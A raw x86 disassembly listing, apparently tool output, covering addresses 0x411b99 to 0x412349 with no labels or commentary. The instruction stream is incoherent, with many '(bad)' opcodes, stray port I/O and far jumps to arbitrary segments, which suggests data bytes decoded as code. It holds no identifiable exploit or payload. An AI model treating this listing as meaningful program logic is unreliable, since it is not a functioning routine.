  411b99:	stos   BYTE PTR es:[edi],al
  411b9a:	ins    BYTE PTR es:[edi],dx
  411b9b:	or     eax,0xf01c4605
  411ba0:	mov    cl,0x38
  411ba2:	js     0x411c20
  411ba4:	mov    ds:0xa2b2e87a,eax
  411ba9:	ja     0x411bd5
  411bab:	inc    edi
  411bac:	add    BYTE PTR [eax],ch
  411bae:	adc    esp,0xf3b06a35
  411bb4:	cli    
  411bb5:	and    eax,0xf58a2aad
  411bba:	cmp    al,0x44
  411bbc:	aas    
  411bbd:	push   esi
  411bbe:	pop    ebx
  411bbf:	scas   al,BYTE PTR es:[edi]
  411bc0:	mov    ch,0x93
  411bc2:	rol    al,0xa
  411bc5:	and    BYTE PTR [eax],bh
  411bc7:	dec    edx
  411bc8:	jo     0x411bb6
  411bca:	mov    dl,0x4d
  411bcc:	inc    edx
  411bcd:	retf   0x243b
  411bd0:	les    edi,FWORD PTR [eax]
  411bd2:	adc    BYTE PTR [ebp+0x18],cl
  411bd5:	fld    DWORD PTR [edx-0x7b9fcfaa]
  411bdb:	test   DWORD PTR [edx],ecx
  411bdd:	push   es
  411bde:	mov    edx,0x43f4d880
  411be3:	and    eax,0x895c7554
  411be8:	inc    ax
  411bea:	push   ss
  411beb:	popa   
  411bec:	adc    DWORD PTR [edx+0x2e],0xddccc888
  411bf3:	cmp    DWORD PTR [edx+0x33],ebx
  411bf6:	fild   QWORD PTR [esi+eiz*8-0x1b7de3e0]
  411bfd:	cmp    eax,0x16f42700
  411c02:	rcl    dh,cl
  411c04:	out    dx,eax
  411c05:	shl    BYTE PTR [edx],0x1
  411c08:	shl    BYTE PTR [ecx+eax*2+0x44],1
  411c0c:	dec    edx
  411c0d:	push   ebp
  411c0e:	xchg   edx,eax
  411c0f:	sbb    BYTE PTR [esi],dh
  411c11:	cld    
  411c12:	mov    DWORD PTR [esi+0x39],ebp
  411c15:	inc    DWORD PTR [eax]
  411c17:	xchg   BYTE PTR [esi-0x2c],dl
  411c1a:	(bad)  
  411c1b:	mov    dh,0x68
  411c1d:	adc    eax,0x3c015ad
  411c22:	sbb    al,0xb4
  411c24:	(bad)  
  411c25:	dec    ecx
  411c26:	xor    al,0x8f
  411c28:	xor    al,0x22
  411c2a:	ss pop ss
  411c2c:	in     al,dx
  411c2d:	int    0x18
  411c2f:	sbb    eax,0x88803d00
  411c34:	mov    dh,BYTE PTR [esi+0x44]
  411c37:	scas   eax,DWORD PTR es:[edi]
  411c38:	push   0x102a0497
  411c3d:	or     al,0x66
  411c3f:	enter  0x52e,0x80
  411c43:	pusha  
  411c44:	jmp    0x411c6e
  411c46:	data16 mov dh,0x3c
  411c49:	cmp    BYTE PTR [edx],cl
  411c4b:	mov    ebx,0xa10130ec
  411c50:	mov    al,ds:0xf6c046c9
  411c55:	mov    eax,ds:0x8e3a9502
  411c5a:	or     BYTE PTR [ebx],dh
  411c5c:	in     al,0xbf
  411c5e:	ficom  WORD PTR [edi+edx*2+0x14]
  411c62:	xor    eax,0x3b04d6b4
  411c67:	push   eax
  411c68:	scas   al,BYTE PTR es:[edi]
  411c69:	ds ins DWORD PTR es:[edi],dx
  411c6b:	jl     0x411c27
  411c6d:	in     eax,dx
  411c6e:	add    BYTE PTR [edi],cl
  411c70:	push   eax
  411c71:	(bad)  
  411c72:	mov    dh,BYTE PTR [ecx]
  411c74:	les    esi,FWORD PTR [ecx-0x4b88b705]
  411c7a:	cmp    al,ch
  411c7c:	sub    BYTE PTR [eax+0x58bf3468],ch
  411c82:	mov    ds:0xe72acde,eax
  411c87:	sbb    bh,BYTE PTR [esi-0x57edd400]
  411c8d:	mov    ecx,0xdf868750
  411c92:	ins    DWORD PTR es:[edi],dx
  411c93:	jge    0x411cd6
  411c95:	cmp    edx,DWORD PTR [esi-0x61c93167]
  411c9b:	lods   eax,DWORD PTR ds:[esi]
  411c9c:	dec    eax
  411c9d:	mov    cl,0xc3
  411c9f:	mov    dl,0x1e
  411ca1:	test   ch,0xc4
  411ca4:	outs   dx,BYTE PTR ds:[esi]
  411ca5:	inc    ebp
  411ca6:	pop    eax
  411ca7:	mul    al
  411ca9:	js     0x411cc0
  411cab:	mov    ch,BYTE PTR [esi]
  411cad:	out    dx,al
  411cae:	shl    BYTE PTR [edi],1
  411cb0:	or     ch,BYTE PTR [eax+ebp*4+0x26e550da]
  411cb7:	inc    eax
  411cb8:	cmp    al,0xfd
  411cba:	mov    esp,0x5d4dc823
  411cbf:	test   BYTE PTR [ebx],0x2a
  411cc2:	add    al,0x9b
  411cc4:	or     al,BYTE PTR [edx+ebp*2-0x72]
  411cc8:	jecxz  0x411d34
  411cca:	adc    BYTE PTR ds:0x825d200d,0xec
  411cd1:	add    ah,BYTE PTR [edx-0x71654ade]
  411cd7:	or     DWORD PTR [eax+edi*8],ebp
  411cda:	addr16 xchg ebp,eax
  411cdc:	adc    BYTE PTR [ebp+0x76],bh
  411cdf:	(bad)  
  411ce1:	and    dl,bl
  411ce3:	sub    bh,BYTE PTR [edx]
  411ce5:	xor    al,0x6a
  411ce7:	aas    
  411ce8:	rol    dl,1
  411cea:	outs   dx,BYTE PTR ds:[esi]
  411ceb:	jmp    0x411ca5
  411ced:	mov    ch,BYTE PTR [edx-0x4b6e7d5a]
  411cf3:	int3   
  411cf4:	xchg   esp,eax
  411cf5:	mov    es,WORD PTR [esi]
  411cf7:	jb     0x411ced
  411cf9:	cmc    
  411cfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cfb:	and    al,bh
  411cfd:	xor    DWORD PTR [ebp+0x5a],edi
  411d00:	cmp    BYTE PTR [edx],ah
  411d02:	adc    BYTE PTR [eax+0x586f00f3],ch
  411d08:	pop    ebx
  411d09:	push   eax
  411d0a:	rcr    DWORD PTR [ecx+esi*4-0x42],1
  411d0e:	enter  0x1e72,0xc0
  411d12:	fs icebp 
  411d14:	sbb    al,0x45
  411d16:	push   es
  411d17:	sub    DWORD PTR [esi-0x7c],esi
  411d1a:	pop    DWORD PTR [edx-0x7e]
  411d1d:	outs   dx,BYTE PTR ds:[esi]
  411d1e:	push   eax
  411d1f:	xor    bl,BYTE PTR [ecx+0x5b]
  411d22:	push   ebx
  411d23:	adc    bh,al
  411d25:	inc    eax
  411d26:	pop    ds
  411d27:	sbb    al,0xd7
  411d29:	mov    ch,ch
  411d2b:	jp     0x411ccf
  411d2d:	ds mov dh,0xe3
  411d30:	test   al,0x3c
  411d32:	loopne 0x411d84
  411d34:	jbe    0x411d73
  411d36:	aam    0x9a
  411d38:	imul   eax,DWORD PTR [ebp+0x75667634],0x20
  411d3f:	mov    esi,0xd9f0e277
  411d44:	add    BYTE PTR [edx],0xa3
  411d47:	dec    eax
  411d48:	and    al,0xe7
  411d4a:	xchg   esi,eax
  411d4b:	js     0x411db9
  411d4d:	hlt    
  411d4e:	lods   eax,DWORD PTR ds:[esi]
  411d4f:	inc    ebx
  411d50:	dec    ecx
  411d51:	xor    al,0xca
  411d53:	cdq    
  411d54:	ds nop
  411d56:	push   fs
  411d58:	(bad)  
  411d59:	dec    ebp
  411d5a:	sbb    eax,0xdec60206
  411d5f:	xchg   esp,eax
  411d60:	mov    esi,0x340876c4
  411d65:	pop    ecx
  411d66:	ds xchg edx,eax
  411d68:	jle    0x411db6
  411d6a:	pop    eax
  411d6b:	lods   eax,DWORD PTR ds:[esi]
  411d6c:	push   0xac52c20f
  411d71:	cld    
  411d72:	inc    eax
  411d73:	or     bh,BYTE PTR [ebp+0x3438fc46]
  411d79:	shl    DWORD PTR [esi+0x8],0x8
  411d7d:	xor    al,BYTE PTR [esi-0x74]
  411d80:	dec    ecx
  411d81:	js     0x411d8d
  411d83:	xchg   ebx,eax
  411d84:	xor    eax,0xe00c8935
  411d89:	pop    esi
  411d8a:	mov    esp,DWORD PTR [eax+0x6d836c7c]
  411d90:	imul   esp,DWORD PTR [ecx+0x58],0x41e6dcc7
  411d97:	int    0x3a
  411d99:	ficomp DWORD PTR [edx-0x2c]
  411d9c:	aad    0x22
  411d9e:	or     al,0xf2
  411da0:	shl    BYTE PTR [edx],0x1f
  411da3:	mov    cs,WORD PTR ds:0x5ceb0a4d
  411da9:	cld    
  411daa:	sbb    cl,BYTE PTR [edx]
  411dac:	das    
  411dad:	loopne 0x411de9
  411daf:	leave  
  411db0:	arpl   WORD PTR ds:[ebx-0xb9577ec],si
  411db7:	ds cmp al,0x75
  411dba:	es push ss
  411dbc:	(bad)  
  411dbd:	xchg   edi,eax
  411dbe:	or     DWORD PTR [edx-0x2c],0x7daa33
  411dc5:	jle    0x411dc9
  411dc7:	sub    dl,cl
  411dc9:	cld    
  411dca:	cli    
  411dcb:	mov    esp,0x6c7560dd
  411dd0:	pop    ds
  411dd1:	or     al,0xf9
  411dd3:	push   ss
  411dd4:	cmp    DWORD PTR [ecx],ebp
  411dd6:	in     al,0xf2
  411dd8:	pop    edx
  411dd9:	inc    ebx
  411dda:	xchg   DWORD PTR [eax+edx*1-0x60],esi
  411dde:	bound  si,DWORD PTR [ebx+eiz*4-0x54]
  411de3:	pusha  
  411de4:	xchg   BYTE PTR ds:0x305ea678,al
  411dea:	push   edx
  411deb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411dec:	cmc    
  411ded:	stos   BYTE PTR es:[edi],al
  411dee:	inc    ecx
  411def:	sub    eax,0xe253b410
  411df4:	mov    al,ds:0xb8a2ae9c
  411df9:	sbb    eax,0x26f82840
  411dfe:	pop    eax
  411dff:	xchg   esp,eax
  411e00:	pusha  
  411e01:	repz sahf 
  411e03:	das    
  411e04:	pop    ebp
  411e05:	pop    ds
  411e06:	mov    ah,0xa2
  411e08:	sbb    al,0xcb
  411e0a:	jl     0x411ddc
  411e0c:	cmp    cl,BYTE PTR [esi]
  411e0e:	lea    ebx,[ecx]
  411e10:	add    al,al
  411e12:	mov    bl,0x8d
  411e14:	pop    edx
  411e15:	push   ebx
  411e16:	dec    esi
  411e17:	js     0x411de0
  411e19:	add    al,0x6a
  411e1b:	cmp    bl,BYTE PTR [ebx+0x41]
  411e1e:	inc    edi
  411e1f:	push   ecx
  411e20:	or     DWORD PTR [edx+0x54],0x18
  411e24:	mov    es,WORD PTR [ebx+eiz*1+0x167eec76]
  411e2b:	cld    
  411e2c:	or     DWORD PTR ds:0x71a40ed6,edx
  411e32:	fild   DWORD PTR [eax]
  411e34:	push   0x4b95ebba
  411e39:	imul   edi,DWORD PTR [ebx+0x22],0x58
  411e3d:	push   0x40
  411e3f:	inc    edi
  411e40:	fs pop edx
  411e42:	jo     0x411e8d
  411e44:	je     0x411e03
  411e46:	mov    al,ds:0x67e0fa0a
  411e4b:	in     al,dx
  411e4c:	mov    cl,0xed
  411e4e:	add    bl,al
  411e50:	aad    0x56
  411e52:	or     DWORD PTR [edx-0x1e],edi
  411e55:	cmc    
  411e56:	jb     0x411e24
  411e58:	cli    
  411e59:	xchg   edi,eax
  411e5a:	jne    0x411ea4
  411e5c:	dec    ebp
  411e5d:	or     eax,0xa3101d9e
  411e62:	and    al,0x77
  411e64:	lahf   
  411e65:	add    al,0x8e
  411e67:	lods   al,BYTE PTR ds:[esi]
  411e68:	cli    
  411e69:	loope  0x411eb7
  411e6b:	enter  0x44a6,0x79
  411e6f:	dec    ebx
  411e70:	sub    edi,DWORD PTR [esi]
  411e72:	add    BYTE PTR [ecx-0xe],0xfa
  411e76:	mov    eax,0xc1548021
  411e7b:	mov    bl,BYTE PTR [edi]
  411e7d:	push   es
  411e7e:	jmp    0xeeaa1f06
  411e83:	cmc    
  411e84:	les    esp,FWORD PTR [esi+0x56]
  411e87:	fnstenv [eax+0x34]
  411e8a:	jl     0x411e52
  411e8c:	ror    DWORD PTR [edi+0x466c0be0],cl
  411e92:	push   esp
  411e93:	jl     0x411e37
  411e95:	fcomp  QWORD PTR [ebx]
  411e97:	enter  0xc49b,0x4
  411e9b:	lods   al,BYTE PTR ds:[esi]
  411e9c:	call   0x48e2409
  411ea1:	lea    edx,[eax-0x3319776c]
  411ea7:	lods   al,BYTE PTR ds:[esi]
  411ea8:	push   es
  411ea9:	test   al,0xa8
  411eab:	sub    al,al
  411ead:	jnp    0x411e87
  411eaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411eb0:	mov    esi,0xd1618e36
  411eb5:	sub    edi,DWORD PTR [edx]
  411eb7:	test   al,0x96
  411eb9:	fcomp  QWORD PTR [edx+0x72]
  411ebc:	add    BYTE PTR [edi-0x5f68aee6],bl
  411ec2:	mov    gs,WORD PTR [ebx-0x43]
  411ec5:	add    BYTE PTR [ebx],0x0
  411ec8:	push   esi
  411ec9:	popf   
  411eca:	pop    esi
  411ecb:	jmp    0xa9b4:0x5022d4c0
  411ed2:	cs cs push es
  411ed5:	iret   
  411ed6:	xchg   edx,eax
  411ed7:	mov    esp,0xbc0d9ed0
  411edc:	sub    BYTE PTR [ebx-0x77db0717],dh
  411ee2:	retf   
  411ee3:	mov    cl,0x50
  411ee5:	rcl    BYTE PTR [eax-0x52],1
  411ee8:	nop
  411ee9:	push   esi
  411eea:	leave  
  411eeb:	mov    ds:0xe90bdccd,al
  411ef0:	and    esi,DWORD PTR [esi]
  411ef2:	push   edx
  411ef3:	inc    esp
  411ef4:	test   BYTE PTR [edx+eax*2-0x4bcce30c],dl
  411efb:	int    0xb6
  411efd:	mov    ch,0x4
  411eff:	mov    bh,0xec
  411f01:	jl     0x411ecd
  411f03:	xchg   edx,eax
  411f04:	xor    DWORD PTR [edx+0x77f40e61],0x2a79b66c
  411f0e:	push   0x0
  411f10:	mov    ebp,0xd62e77a7
  411f15:	mov    dl,0x70
  411f17:	adc    ch,dl
  411f19:	add    BYTE PTR [ecx],ah
  411f1b:	push   ss
  411f1c:	mov    DWORD PTR [ecx],ecx
  411f1e:	xor    al,0x93
  411f20:	out    dx,al
  411f21:	out    0x1e,al
  411f23:	shl    DWORD PTR [ecx+0x6e881435],cl
  411f29:	jmp    0x2a25:0x523acea5
  411f30:	mov    bl,0x49
  411f32:	mov    cl,0x2
  411f34:	sub    al,0x6b
  411f36:	add    al,0x10
  411f38:	xor    al,0xc6
  411f3a:	dec    esi
  411f3b:	add    al,0x54
  411f3d:	sub    BYTE PTR [esi-0x146b8fc2],dh
  411f43:	jbe    0x411ed9
  411f45:	jns    0x411f66
  411f47:	rol    BYTE PTR [edx+0xb43e0b],cl
  411f4d:	jae    0x411eeb
  411f4f:	repnz mov bh,0x66
  411f52:	dec    esi
  411f53:	popa   
  411f54:	lahf   
  411f55:	add    DWORD PTR [edx-0x35bf5198],0xba7c519a
  411f5f:	mov    cl,BYTE PTR [edx]
  411f61:	push   eax
  411f62:	jl     0x411eff
  411f64:	push   0x6c
  411f66:	es repz pop esp
  411f69:	aas    
  411f6a:	adc    al,0x1b
  411f6c:	call   0x981c:0x6aaf448a
  411f73:	mov    bl,0x25
  411f75:	add    BYTE PTR [eax+ebx*8],0x4
  411f79:	or     ecx,DWORD PTR [esi-0x4f]
  411f7c:	jbe    0x411f74
  411f7e:	cmp    ah,BYTE PTR [eax+0x404f9473]
  411f84:	and    eax,edx
  411f86:	mov    al,ds:0x669c4e86
  411f8b:	cmp    al,BYTE PTR [edi-0x15]
  411f8e:	push   eax
  411f8f:	ins    BYTE PTR es:[edi],dx
  411f90:	mov    al,ds:0xa2a616ba
  411f95:	mov    ah,0xe8
  411f97:	cmp    BYTE PTR [eax],al
  411f99:	and    BYTE PTR [esi+0x73b47cc8],0x0
  411fa0:	mov    edi,0xbdba8cd8
  411fa5:	int3   
  411fa6:	dec    edi
  411fa7:	stos   DWORD PTR es:[edi],eax
  411fa8:	cmp    eax,0x64585d0
  411fad:	test   BYTE PTR [ebx+0x70],dl
  411fb0:	std    
  411fb1:	out    0xb4,al
  411fb3:	neg    BYTE PTR [ecx]
  411fb5:	sar    BYTE PTR [edi+0x23],0x68
  411fb9:	jp     0x411ff1
  411fbb:	call   0x1549:0xfa1fc4bd
  411fc2:	adc    al,0xd8
  411fc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fc5:	mov    edx,0x598cf632
  411fca:	or     DWORD PTR [ebp-0x13],0xfa06ae4a
  411fd1:	and    eax,0x2d420fac
  411fd6:	mov    edx,0x23003e1a
  411fdb:	repnz mov dh,0xb6
  411fde:	sub    DWORD PTR [eax-0x44],eax
  411fe1:	jge    0x412003
  411fe3:	jbe    0x411fdd
  411fe5:	daa    
  411fe6:	addr16 into 
  411fe8:	sub    ch,0x1c
  411feb:	jge    0x411fed
  411fed:	(bad)  
  411fee:	push   esi
  411fef:	in     al,dx
  411ff0:	mov    cl,0x50
  411ff2:	shr    BYTE PTR [ebp-0x10],1
  411ff5:	loope  0x411fcd
  411ff7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ff8:	and    BYTE PTR [esi],dl
  411ffa:	push   0x960a8b45
  411fff:	mov    dl,0x56
  412001:	sub    BYTE PTR [esi+esi*4-0x7e],al
  412005:	jl     0x412014
  412007:	in     eax,dx
  412008:	inc    ebx
  412009:	pop    edx
  41200a:	loopne 0x41200c
  41200c:	test   bh,ch
  41200e:	sti    
  41200f:	and    al,0x5f
  412011:	lods   al,BYTE PTR ds:[esi]
  412012:	adc    BYTE PTR ds:0x72551935,al
  412018:	pop    ecx
  412019:	cmp    al,0xa6
  41201b:	sub    dh,BYTE PTR [esi]
  41201d:	fdecstp 
  41201f:	in     al,0x4a
  412021:	adc    BYTE PTR [ebp+0x27],0x16
  412025:	dec    esp
  412026:	in     al,dx
  412027:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412028:	adc    BYTE PTR [ecx+0x64d8195c],ah
  41202e:	inc    esi
  41202f:	imul   esp,DWORD PTR [esp+edx*2+0x67],0x54341515
  412037:	pop    esi
  412038:	retf   0xf6a4
  41203b:	fdivrp st(5),st
  41203d:	xchg   BYTE PTR [ecx-0x49],ah
  412040:	mov    al,0xab
  412042:	mov    ds:0x4fccdf94,eax
  412047:	out    0xf3,al
  412049:	push   cs
  41204a:	jbe    0x41209c
  41204c:	pop    eax
  41204d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41204e:	jmp    0x9a1a:0xf3f03df5
  412055:	pop    ss
  412056:	ins    DWORD PTR es:[edi],dx
  412057:	stos   BYTE PTR es:[edi],al
  412058:	sub    BYTE PTR ds:0x44792294,cl
  41205e:	xor    al,BYTE PTR [eax]
  412060:	icebp  
  412061:	scas   eax,DWORD PTR es:[edi]
  412062:	fsubr  QWORD PTR [eax]
  412064:	mov    eax,0xb3c4d66d
  412069:	out    dx,al
  41206a:	jl     0x41203b
  41206c:	shl    DWORD PTR [ebx+eax*2],cl
  41206f:	add    ch,al
  412071:	adc    dl,BYTE PTR [esi+0x2ad91455]
  412077:	dec    esi
  412078:	pushf  
  412079:	stos   BYTE PTR es:[edi],al
  41207a:	inc    esi
  41207b:	cs retf 
  41207d:	test   DWORD PTR [eax+0x1c940819],ebp
  412083:	mov    esp,DWORD PTR [esi]
  412085:	retf   0x64d0
  412088:	ins    DWORD PTR es:[edi],dx
  412089:	push   ebx
  41208a:	pusha  
  41208b:	xor    al,0xf0
  41208d:	ror    BYTE PTR [edx],cl
  41208f:	or     ecx,DWORD PTR [esi+0xa66f734]
  412095:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  412097:	xchg   edx,eax
  412098:	sub    BYTE PTR [ebp+0x31],dh
  41209b:	mov    edx,0xe14c99
  4120a0:	shl    BYTE PTR [esi+0x6c075282],0xd2
  4120a7:	adc    eax,DWORD PTR [edi]
  4120a9:	aad    0xb0
  4120ab:	test   al,0x2c
  4120ad:	fwait
  4120ae:	sbb    dl,BYTE PTR [ecx]
  4120b0:	inc    edi
  4120b1:	enter  0xf2c2,0xb
  4120b5:	test   DWORD PTR [eax],eax
  4120b7:	fisub  DWORD PTR [edx-0x66]
  4120ba:	cmp    ah,BYTE PTR [edx]
  4120bc:	xchg   edi,ecx
  4120be:	push   es
  4120bf:	stos   BYTE PTR es:[edi],al
  4120c0:	push   ds
  4120c1:	dec    esp
  4120c2:	popf   
  4120c3:	lahf   
  4120c4:	cld    
  4120c5:	xor    ch,BYTE PTR [edx+eax*8]
  4120c8:	inc    esp
  4120c9:	pop    ebx
  4120ca:	stos   DWORD PTR es:[edi],eax
  4120cb:	mov    dl,0xc
  4120cd:	out    dx,al
  4120ce:	xor    ah,cl
  4120d0:	or     bh,BYTE PTR [ecx]
  4120d2:	push   ss
  4120d3:	mov    ebx,0xf46dd45c
  4120d8:	rcr    eax,1
  4120da:	pop    esi
  4120db:	mov    ebx,DWORD PTR [eax+esi*4-0x52]
  4120df:	jae    0x412150
  4120e1:	sahf   
  4120e2:	jnp    0x4120f7
  4120e4:	pop    ss
  4120e5:	js     0x412128
  4120e7:	test   BYTE PTR [ebx+0x27a1ec4d],cl
  4120ed:	add    DWORD PTR [ebx-0x7b],ebx
  4120f0:	out    0x52,al
  4120f2:	xchg   dl,cl
  4120f4:	or     ecx,ecx
  4120f6:	jmp    0xeebf:0x8aad99aa
  4120fd:	xor    bh,ah
  4120ff:	sub    ah,cl
  412101:	aad    0x16
  412103:	push   ebp
  412104:	mov    ebp,0x7fb906
  412109:	pop    esi
  41210a:	pop    edx
  41210b:	and    esi,esp
  41210d:	pop    ss
  41210e:	inc    edx
  41210f:	jo     0x4120d3
  412111:	sub    BYTE PTR [edx-0x6de9da7c],ah
  412117:	sbb    eax,ebx
  412119:	popa   
  41211a:	pop    ebx
  41211b:	jmp    0x4120bf
  41211d:	lods   eax,DWORD PTR ds:[esi]
  41211e:	push   ss
  41211f:	or     eax,DWORD PTR [esp+edx*4]
  412122:	js     0x41212e
  412124:	mov    ch,BYTE PTR [ebx]
  412126:	pop    ss
  412127:	test   eax,0xdcd2e2a0
  41212c:	dec    esp
  41212d:	push   ss
  41212e:	loopne 0x4120de
  412130:	mov    cl,0xb4
  412132:	inc    eax
  412133:	mov    ah,0xab
  412135:	out    dx,al
  412136:	rcl    BYTE PTR [esi+0x47],1
  412139:	sub    al,BYTE PTR [edx]
  41213b:	adc    dh,ch
  41213d:	mov    al,ds:0x87e9d86b
  412142:	idiv   dl
  412144:	push   ecx
  412145:	(bad)
  412148:	outs   dx,BYTE PTR ds:[esi]
  412149:	push   ds
  41214a:	out    dx,al
  41214b:	or     DWORD PTR [edx+0x0],ebx
  41214e:	inc    edi
  41214f:	ror    DWORD PTR [eax+0xa],0x8
  412153:	mov    ebx,0xfee3b483
  412159:	xchg   ecx,eax
  41215a:	scas   al,BYTE PTR es:[edi]
  41215b:	pop    es
  41215c:	inc    ecx
  41215d:	inc    esp
  41215e:	in     eax,0x44
  412160:	push   es
  412161:	ss pop esp
  412163:	push   0x4f
  412165:	mov    ch,0xc8
  412167:	(bad)  
  412168:	bound  ecx,QWORD PTR [edi+0x4d825dff]
  41216e:	lahf   
  41216f:	(bad)  
  412170:	jno    0x4121c4
  412172:	clc    
  412173:	or     DWORD PTR [edx],edx
  412175:	xchg   bh,cl
  412177:	(bad)  
  412178:	lods   ax,WORD PTR ds:[esi]
  41217a:	pop    edx
  41217b:	mov    al,ds:0x1612049f
  412180:	or     ah,cl
  412182:	sbb    cl,BYTE PTR [eax+ebx*8]
  412185:	mov    cl,BYTE PTR [esi-0x1538b1d6]
  41218b:	jb     0x412187
  41218d:	mov    WORD PTR [esp+eiz*2],es
  412190:	lock dec ebp
  412192:	lods   eax,DWORD PTR ds:[esi]
  412193:	adc    eax,0xdf0a6a42
  412198:	jo     0x412174
  41219a:	inc    eax
  41219b:	pop    edi
  41219c:	mov    WORD PTR [eax],es
  41219e:	into   
  41219f:	pop    ss
  4121a0:	push   ecx
  4121a1:	imul   edi,edx,0xffffff87
  4121a4:	xchg   esp,eax
  4121a5:	nop
  4121a6:	add    al,BYTE PTR [eax]
  4121a8:	sbb    bl,BYTE PTR [edx-0x79961d56]
  4121ae:	pop    ebp
  4121af:	arpl   bp,ax
  4121b1:	pop    ebx
  4121b2:	mov    ds:0x9a11c4,eax
  4121b7:	(bad)  
  4121b8:	mov    esi,0x7762f970
  4121bd:	adc    al,0x35
  4121bf:	dec    ebp
  4121c0:	add    eax,0xec6c583a
  4121c5:	sbb    bh,BYTE PTR [edx-0x16]
  4121c8:	adc    dl,cl
  4121ca:	ss ds lock jmp 0x4121d9
  4121cf:	cs scas al,BYTE PTR es:[edi]
  4121d1:	ins    DWORD PTR es:[edi],dx
  4121d2:	fwait
  4121d3:	lods   eax,DWORD PTR ds:[esi]
  4121d4:	push   edx
  4121d5:	dec    ebx
  4121d6:	or     BYTE PTR [esi+0x20],0x3b
  4121da:	mov    esi,0x41006f46
  4121df:	dec    eax
  4121e0:	jl     0x4121fd
  4121e2:	enter  0x1020,0x14
  4121e6:	mov    ds:0x47a4b587,al
  4121eb:	shl    BYTE PTR [edx],0x8a
  4121ee:	mov    ss,WORD PTR [ecx]
  4121f0:	fmul   DWORD PTR [ebx+edi*4]
  4121f3:	dec    edx
  4121f4:	adc    ebp,DWORD PTR [ebp-0x5d31bf3e]
  4121fa:	push   esi
  4121fb:	cmp    eax,0x1626ef01
  412200:	dec    esp
  412201:	sub    BYTE PTR [eax+0x15],bh
  412204:	sbb    BYTE PTR [esi],dh
  412206:	jno    0x412234
  412208:	jo     0x4121c7
  41220a:	mov    ds:0x8015e3b0,al
  41220f:	cmp    al,0xd2
  412211:	or     eax,0x257b02f0
  412216:	adc    BYTE PTR [ebx+0x29],0xac
  41221a:	shl    BYTE PTR [edx],0x34
  41221d:	add    BYTE PTR [ebx-0x68],ah
  412220:	loope  0x4121e4
  412222:	ficomp DWORD PTR [eax-0x7e13a40a]
  412228:	out    0x6e,al
  41222a:	mov    dh,0x78
  41222c:	add    BYTE PTR [edx+ebx*8],dh
  41222f:	pop    ebx
  412230:	xor    bl,BYTE PTR [ebp-0x75b6466e]
  412236:	or     bl,BYTE PTR [edx+0x13]
  412239:	enter  0x7294,0x70
  41223d:	popf   
  41223e:	sub    BYTE PTR [edi+0x4e],al
  412241:	mov    bh,0xa4
  412243:	add    BYTE PTR [edx],bh
  412245:	stos   BYTE PTR es:[edi],al
  412246:	push   ds
  412247:	aam    0x8a
  412249:	xor    BYTE PTR [eax],0xa8
  41224c:	jmp    0xa802:0x7dc4da5b
  412253:	xchg   esp,eax
  412254:	mov    ah,0x2f
  412256:	mov    DWORD PTR ds:0x41e6ad15,edx
  41225c:	push   ss
  41225d:	add    eax,0x2db2d54c
  412262:	xor    eax,0x71d5d4d1
  412267:	ins    BYTE PTR es:[edi],dx
  412268:	push   edi
  412269:	push   ds
  41226a:	xchg   ecx,eax
  41226b:	mov    dh,0x22
  41226d:	mov    cs:0x54d555de,eax
  412273:	push   ss
  412274:	repnz les esi,FWORD PTR ds:0x30f8cf42
  41227b:	arpl   WORD PTR [eax],ax
  41227d:	mov    dl,0xa0
  41227f:	retf   
  412280:	fidiv  DWORD PTR [esi+0x28]
  412283:	(bad)  
  412284:	(bad)  
  412285:	and    ah,BYTE PTR [edx+esi*4-0xe]
  412289:	sti    
  41228a:	(bad)  
  41228b:	mov    bh,0x81
  41228d:	add    ah,BYTE PTR [eax]
  41228f:	and    al,0x0
  412291:	jne    0x4122e7
  412293:	or     BYTE PTR [edx+0x78216a47],0x20
  41229a:	xor    al,0xdc
  41229c:	frstor [eax-0x39c8f927]
  4122a2:	cmp    BYTE PTR [ebx+edx*4+0x10a0c416],dh
  4122a9:	push   esi
  4122aa:	push   esp
  4122ab:	adc    al,0x9a
  4122ad:	mov    eax,ebp
  4122af:	lahf   
  4122b0:	push   edx
  4122b1:	add    al,0x42
  4122b3:	mov    dh,0x5a
  4122b5:	xor    ecx,0x16
  4122b8:	push   edx
  4122b9:	dec    ebp
  4122ba:	mov    eax,0x9a2a8bfd
  4122bf:	mov    WORD PTR [esp+ebp*4-0x1b],?
  4122c3:	(bad)  
  4122c4:	dec    esi
  4122c5:	stos   BYTE PTR es:[edi],al
  4122c6:	mov    esi,0x4d1d02b
  4122cb:	add    eax,0x8884a336
  4122d0:	inc    esp
  4122d1:	in     al,0xde
  4122d3:	out    0x4d,al
  4122d5:	jo     0x412328
  4122d7:	mov    ah,0x29
  4122d9:	call   0x0:0xc50a4211
  4122e0:	pop    ebx
  4122e1:	push   ebp
  4122e2:	test   BYTE PTR [esi+0x8af7ad6],al
  4122e8:	stos   BYTE PTR es:[edi],al
  4122e9:	xlat   BYTE PTR ds:[ebx]
  4122ea:	inc    ecx
  4122eb:	inc    ecx
  4122ec:	mov    bl,0x86
  4122ee:	push   esp
  4122ef:	aam    0x9c
  4122f1:	sub    BYTE PTR [eax],0x5d
  4122f4:	sub    dl,BYTE PTR [edx+0x2a68254]
  4122fa:	ins    BYTE PTR es:[edi],dx
  4122fb:	dec    edi
  4122fc:	cmp    ebp,DWORD PTR [edx-0x6e]
  4122ff:	call   0xd88a1f9f
  412304:	call   0xd02b:0xf9ae80aa
  41230b:	mov    ebp,0x1600c782
  412310:	pop    esp
  412311:	mov    al,0xc3
  412313:	mov    ds:0xb8182549,al
  412318:	mov    ah,0x22
  41231a:	rep stos BYTE PTR es:[edi],al
  41231c:	adc    DWORD PTR [esi-0x66],esp
  41231f:	add    BYTE PTR [edx+0x58],al
  412322:	mov    esp,0xc0d5be79
  412327:	and    eax,0xc6fe0c88
  41232c:	jne    0x412398
  41232e:	jmp    0x8b2e:0xcac03a70
  412335:	inc    esi
  412336:	imul   ecx,DWORD PTR [edi-0x59c3afa8],0x12
  41233d:	retf   
  41233e:	mov    ebx,0xfe3a9c2e
  412343:	mov    al,bl
  412345:	push   esi
  412346:	rcr    BYTE PTR [edx-0x64],1
  412349:	add    al,0x9
